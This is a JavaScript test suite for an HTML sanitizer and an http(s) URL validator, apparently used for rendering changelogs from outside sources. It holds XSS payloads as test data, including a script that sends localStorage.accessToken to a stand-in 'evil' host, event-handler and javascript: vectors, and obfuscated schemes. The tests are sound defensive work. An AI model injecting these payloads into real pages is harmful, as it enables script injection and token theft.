import { describe, it, expect } from 'vitest';
import { sanitizeExternalHtml, safeHttpUrl, MAX_SANITIZED_INPUT_LENGTH } from './htmlSanitizer.js';

describe('sanitizeExternalHtml — script vectors', () => {
  it('drops <script> elements together with their content', () => {
    const out = sanitizeExternalHtml(
      '<p>Fixes</p><script>fetch("//evil/"+localStorage.accessToken)</script><p>more</p>',
    );
    expect(out).toBe('<p>Fixes</p><p>more</p>');
  });

  it('drops script with odd casing, attributes and a self-closing slash', () => {
    expect(sanitizeExternalHtml('a<ScRiPt/src="//evil/x.js"></sCrIpT >b')).toBe('ab');
  });

  it('drops an unclosed <script> and everything after it', () => {
    expect(sanitizeExternalHtml('ok<script>alert(1)')).toBe('ok');
  });

  it('removes event handler attributes', () => {
    const out = sanitizeExternalHtml(
      '<img src="https://cdn.example/a.png" onerror="alert(1)" onload=alert(2)>',
    );
    expect(out).toBe('<img src="https://cdn.example/a.png">');
    expect(out).not.toMatch(/on(error|load)/i);
  });

  it('removes style/class/id attributes', () => {
    const out = sanitizeExternalHtml(
      '<p style="position:fixed" class="fixed inset-0" id="app">x</p>',
    );
    expect(out).toBe('<p>x</p>');
  });

  it('drops javascript:, data: and relative URLs from links and images', () => {
    expect(sanitizeExternalHtml('<a href="javascript:alert(1)">x</a>')).toBe('<a>x</a>');
    expect(sanitizeExternalHtml('<a href=" jav&#x09;ascript:alert(1)">x</a>')).toBe('<a>x</a>');
    expect(sanitizeExternalHtml('<a href="java\tscript:alert(1)">x</a>')).toBe('<a>x</a>');
    expect(sanitizeExternalHtml('<a href="/api/auth/refresh">x</a>')).toBe('<a>x</a>');
    expect(sanitizeExternalHtml('<img src="data:image/svg+xml,<svg onload=alert(1)>">')).toBe(
      '<img>',
    );
  });

  it('keeps http(s) links and forces noopener + new tab', () => {
    expect(
      sanitizeExternalHtml(
        '<a href="https://example.com/notes?a=1&amp;b=2" target="_self">notes</a>',
      ),
    ).toBe(
      '<a href="https://example.com/notes?a=1&amp;b=2" rel="noopener noreferrer nofollow" target="_blank">notes</a>',
    );
  });

  it('re-escapes attribute values so quotes cannot break out', () => {
    const out = sanitizeExternalHtml(
      '<a href="https://x.test/" title="&quot; onmouseover=&quot;alert(1)">t</a>',
    );
    expect(out).toContain('title="&quot; onmouseover=&quot;alert(1)"');
    expect(out).not.toContain('" onmouseover="');
  });

  it('removes iframes, svg, forms and their content', () => {
    expect(sanitizeExternalHtml('a<iframe src="https://evil"></iframe>b')).toBe('ab');
    expect(sanitizeExternalHtml('a<svg><script>alert(1)</script></svg>b')).toBe('ab');
    expect(sanitizeExternalHtml('a<form action="https://evil"><input name="p"></form>b')).toBe(
      'ab',
    );
  });

  it('treats <!--> and <!---> as complete comments like browsers do', () => {
    expect(sanitizeExternalHtml('a<!-->b<!--->c')).toBe('abc');
  });

  it('strips comments and markup declarations', () => {
    expect(
      sanitizeExternalHtml('a<!-- <script>alert(1)</script> -->b<!DOCTYPE html>c<![CDATA[x]]>d'),
    ).toBe('abcd');
  });

  it('turns an unterminated tag into text instead of markup', () => {
    expect(sanitizeExternalHtml('fine <img src=x onerror=alert(1)')).toBe(
      'fine &lt;img src=x onerror=alert(1)',
    );
  });
});

describe('sanitizeExternalHtml — content preservation', () => {
  it('keeps the formatting tags changelogs use', () => {
    const html =
      '<h2>v1.2</h2><ul><li><strong>New:</strong> <em>thing</em></li></ul><pre><code>x</code></pre><br><hr>';
    expect(sanitizeExternalHtml(html)).toBe(html);
  });

  it('keeps unknown tags out but their text in', () => {
    expect(sanitizeExternalHtml('<details><summary>More</summary>text</details>')).toBe('Moretext');
  });

  it('escapes Markdown/plain text without mangling existing entities', () => {
    expect(sanitizeExternalHtml('## Fixes\n- a < b && c > d\n- "quoted" & it\'s &amp; ok')).toBe(
      '## Fixes\n- a &lt; b &amp;&amp; c &gt; d\n- &quot;quoted&quot; &amp; it&#39;s &amp; ok',
    );
  });

  it('returns undefined for empty or non-string input', () => {
    expect(sanitizeExternalHtml('')).toBeUndefined();
    expect(sanitizeExternalHtml(undefined)).toBeUndefined();
    expect(sanitizeExternalHtml(42)).toBeUndefined();
  });

  it('truncates oversized input', () => {
    const out = sanitizeExternalHtml('a'.repeat(MAX_SANITIZED_INPUT_LENGTH + 500));
    expect(out).toHaveLength(MAX_SANITIZED_INPUT_LENGTH);
  });

  it('stays fast on pathological input', () => {
    const evil = '<a title="'.repeat(20_000);
    const t0 = Date.now();
    sanitizeExternalHtml(evil);
    expect(Date.now() - t0).toBeLessThan(1000);
  });
});

describe('safeHttpUrl', () => {
  it('accepts absolute http(s) URLs and normalizes them', () => {
    expect(safeHttpUrl('HTTPS://Example.com/a b')).toBe('https://example.com/a%20b');
    expect(safeHttpUrl('  http://example.com/  ')).toBe('http://example.com/');
  });

  it('rejects other schemes and relative URLs', () => {
    expect(safeHttpUrl('javascript:alert(1)')).toBeNull();
    expect(safeHttpUrl('&#106;avascript:alert(1)')).toBeNull();
    expect(safeHttpUrl('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(safeHttpUrl('//evil.example/x')).toBeNull();
    expect(safeHttpUrl('/api/server/stop')).toBeNull();
  });
});
